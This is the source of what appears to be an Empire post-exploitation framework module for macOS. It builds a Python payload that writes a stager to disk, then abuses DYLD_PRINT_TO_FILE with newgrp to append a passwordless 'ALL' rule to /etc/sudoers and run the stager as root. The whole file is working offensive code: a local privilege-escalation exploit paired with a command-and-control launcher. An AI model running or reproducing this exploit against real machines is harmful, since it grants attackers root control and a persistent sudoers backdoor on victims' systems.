import logging

from empire.server.common.empire import MainMenu
from empire.server.core.module_models import EmpireModule

log = logging.getLogger(__name__)


class Module:
    @staticmethod
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        # the Python script itself, with the command to invoke
        #   for execution appended to the end. Scripts should output
        #   everything to the pipeline for proper parsing.
        #
        # the script should be stripped of comments, with a link to any
        #   original reference script included in the comments.
        listenername = params["Listener"]
        user_agent = params["UserAgent"]
        safe_checks = params["SafeChecks"]

        launcher = main_menu.stagergenv2.generate_launcher(
            listenername,
            language="python",
            user_agent=user_agent,
            safe_checks=safe_checks,
        )
        if launcher == "":
            log.error("Error in launcher generation")
        launcher = launcher.replace('"', '\\"')
        fullPath = params["WriteablePath"] + params["FileName"]
        fileName = params["FileName"]
        return f"""
import os
print("Writing Stager to {fileName}...")
file = open("{fullPath}","w")
file.write("{launcher}")
file.close()
print("Attempting to execute stager as root...")
try:
	os.system("echo 'echo \\"$(whoami) ALL=(ALL) NOPASSWD:ALL\\" >&3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp; sudo /bin/sh {fullPath} &")
	print("Successfully ran command, you should be getting an elevated stager")
except:
	print("[!] Could not execute payload!")

	"""
